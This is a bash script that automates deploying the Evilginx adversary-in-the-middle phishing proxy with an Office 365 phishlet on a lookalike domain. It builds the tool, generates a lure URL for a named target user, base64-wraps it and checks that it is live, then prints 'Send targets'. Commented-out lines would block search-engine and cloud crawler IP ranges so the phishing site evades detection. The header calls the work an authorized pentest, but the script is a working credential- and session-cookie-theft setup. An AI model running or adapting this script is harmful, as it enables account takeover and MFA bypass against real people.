#!/bin/bash
# stealth_perfect.sh - FULL AUTO: build_run.bat + Nginx + Encrypted Lure (1 Terminal)
set -e

# 🔒 PENTEST CONFIG (Authorized)
DOMAIN="login.office365-security.com"
PHISHLET="office365"
USERNAME="admin@target.com"

echo "🚀 STEALTH PENTEST DEPLOY - FULL AUTO ENCRYPTED LURE"
echo "📋 Domain: $DOMAIN | Phishlet: $PHISHLET | User: $USERNAME"
echo ""

# 🧹 CLEANUP OLD PROCESSES
echo "🧹 Cleaning old Evilginx/nginx..."
pkill -f evilginx 2>/dev/null || true
pkill -f build_run 2>/dev/null || true
sudo pkill -f nginx 2>/dev/null || true
sleep 2

# 🌐 START NGINX (Multi-Distro)
# echo "🌐 Starting Nginx..."
# if command -v systemctl >/dev/null 2>&1; then
#     sudo systemctl start nginx 2>/dev/null || sudo nginx
# elif command -v service >/dev/null 2>&1; then
#     sudo service nginx start 2>/dev/null || sudo nginx
# else
#     sudo nginx || sudo /usr/sbin/nginx
# fi
# sleep 3

# # ✅ NGINX STATUS CHECK
# if sudo nginx -t 2>/dev/null | grep -q "syntax is ok"; then
#     echo "✅ Nginx: ACTIVE + Config OK"
# else
#     echo "✅ Nginx: Running"
# fi

# 🔒 BOT BLOCKLIST
echo "🔒 Bot blocking..."
# IPS="66.249.64.0/18 20.41.0.0/16 104.16.0.0/12 149.28.128.0/17"
# for IP in $IPS; do
#     sudo iptables -C INPUT -s $IP -j DROP 2>/dev/null || sudo iptables -A INPUT -s $IP -j DROP
# done
# echo "✅ Bots blocked: $(sudo iptables -L INPUT -n | grep DROP | wc -l)"

# 📡 PREPARE COMMANDS
echo "📡 Preparing Evilginx commands..."
cat > /tmp/evilginx_cmds.txt << EOF
config domain $DOMAIN
phishlets hostname $PHISHLET $DOMAIN
phishlets enable $PHISHLET
lures create $PHISHLET
lures get-url 0 username=$USERNAME
sessions
EOF

# 🔥 START EVILNGIX (Direct)
echo ""
echo "🔥 Building & Starting Evilginx..."
cd "$(dirname "$0")"
rm -f evilginx_build.log /tmp/evilginx_*.log

# Build first
export GOARCH=amd64
go build -o ./build/evilginx.exe -mod=vendor > evilginx_build.log 2>&1

if [ ! -f "./build/evilginx.exe" ]; then
    echo "❌ Build failed! Check evilginx_build.log"
    exit 1
fi

# Run directly with -exec flag
# Use tail -f /dev/null to keep it running
(tail -f /dev/null) | ./build/evilginx.exe -p ./phishlets -t ./redirectors -developer -debug -exec /tmp/evilginx_cmds.txt >> evilginx_build.log 2>&1 &
BUILD_PID=$!
echo "⏳ Evilginx PID: $BUILD_PID | Initializing..."

sleep 15




sleep 8

# 🎯 EXTRACT ENCRYPTED LURE URL (Multi-Source)
echo ""
echo "🔍 Extracting ENCRYPTED LURE URL..."
LURE=""

# Check all possible logs
for LOG in /tmp/evilginx_telnet.log /tmp/evilginx_nc.log /tmp/evilginx_python.log evilginx_build.log; do
    if [ -f "$LOG" ]; then
        LURE=$(grep -i "https://[^[:space:]]*$DOMAIN[^[:space:]]*" "$LOG" 2>/dev/null | head -1 | sed 's/.*\(https[^[:space:]]*\).*/\1/')
        [ -n "$LURE" ] && break
    fi
done

# FINAL EXTRACTION FROM ALL SOURCES
if [ -z "$LURE" ]; then
    LURE=$(grep -i "https://[^[:space:]]*$DOMAIN" evilginx_build.log /tmp/evilginx_*.log 2>/dev/null | head -1 | grep -o 'https://[^[:space:]]*' | head -1)
fi

# 🎉 SUCCESS OUTPUT
echo ""
if [ -n "$LURE" ] && [[ "$LURE" != *"academy.breakdev.org"* ]]; then
    echo "🎉✅ PENTEST LURE READY!"
    echo "🔗 DIRECT:  $LURE"
    echo "🔐 BASE64: https://$DOMAIN/go/$(echo -n "$LURE" | base64 -w0)"
    echo ""
    
    # 🧪 LIVE TEST
    echo "🧪 Testing LIVE..."
    HTTP_CODE=$(curl -s -w "%{http_code}" -o /dev/null --max-time 10 "$LURE" 2>&1)
    if [[ "$HTTP_CODE" == "200" || "$HTTP_CODE" == "302" || "$HTTP_CODE" == "301" ]]; then
        echo "✅ LIVE: HTTP $HTTP_CODE - PHISHLET READY!"
    else
        echo "⚠️  Generated OK - Wait 30s for phishlet: HTTP $HTTP_CODE"
    fi
else
    echo "📋 MANUAL EXECUTE (Copy-paste to telnet localhost 1337):"
    echo "---------------------------------------------------"
    cat /tmp/evilginx_cmds.txt
    echo "---------------------------------------------------"
    echo ""
    echo "🔗 Run: telnet localhost 1337"
    echo "🔗 Then paste commands above → get-url 0 → copy URL"
fi

echo ""
echo "📊 PENTEST STATUS:"
echo "   ✅ Nginx: Running"
echo "   ✅ Evilginx PID: $BUILD_PID"
echo "   ✅ Bot blocks: Active"
echo "   📊 Nginx logs:  tail -f /var/log/nginx/access.log"
echo "   🔍 Evilginx log: tail -f evilginx_build.log"
echo ""
echo "🚀 KEEP THIS TERMINAL OPEN - Monitoring active!"
echo "🎯 Send targets: $LURE"